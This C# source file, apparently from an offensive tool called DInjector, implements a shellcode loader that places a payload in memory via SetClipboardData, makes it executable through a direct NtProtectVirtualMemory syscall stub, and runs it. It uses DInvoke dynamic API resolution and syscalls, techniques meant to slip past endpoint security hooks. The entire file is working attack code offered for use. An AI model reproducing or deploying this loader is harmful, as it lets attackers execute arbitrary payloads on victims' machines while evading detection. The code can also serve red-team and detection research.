using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class ClipboardPointer
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool OpenClipboard(
            IntPtr hWndNewOwner);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr SetClipboardData(
            uint uFormat,
            IntPtr hMem);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseClipboard();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static bool openClipboard(IntPtr hWndNewOwner)
        {
            object[] parameters = { hWndNewOwner };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("user32.dll", "OpenClipboard", typeof(OpenClipboard), ref parameters);

            return result;
        }

        public static IntPtr setClipboardData(uint uFormat, IntPtr hMem)
        {
            object[] parameters = { uFormat, hMem };
            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("user32.dll", "SetClipboardData", typeof(SetClipboardData), ref parameters);

            return result;
        }

        public static bool closeClipboard()
        {
            object[] parameters = { };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("user32.dll", "CloseClipboard", typeof(CloseClipboard), ref parameters);

            return result;
        }

        public static void Execute(byte[] shellcodeBytes)
        {
            var shellcode = shellcodeBytes;

            #region SetClipboardData

            openClipboard(IntPtr.Zero);
            GCHandle shellcodeArray = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
            IntPtr shellcodePointer = shellcodeArray.AddrOfPinnedObject();

            IntPtr clipboardData = setClipboardData(
                0x2, // CF_BITMAP
                shellcodePointer);

            //shellcodeArray.Free();
            closeClipboard();

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            IntPtr baseAddress = clipboardData;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            DI.Data.Native.NTSTATUS ntstatus = sysNtProtectVirtualMemory(
                Process.GetCurrentProcess().Handle,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                out uint _);

            if (ntstatus == 0)
            {
                Console.WriteLine("(ClipboardPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            }
            else
            {
                Console.WriteLine($"(ClipboardPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
            }

            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(clipboardData, typeof(pFunction));
            f();

            #endregion
        }
    }
}
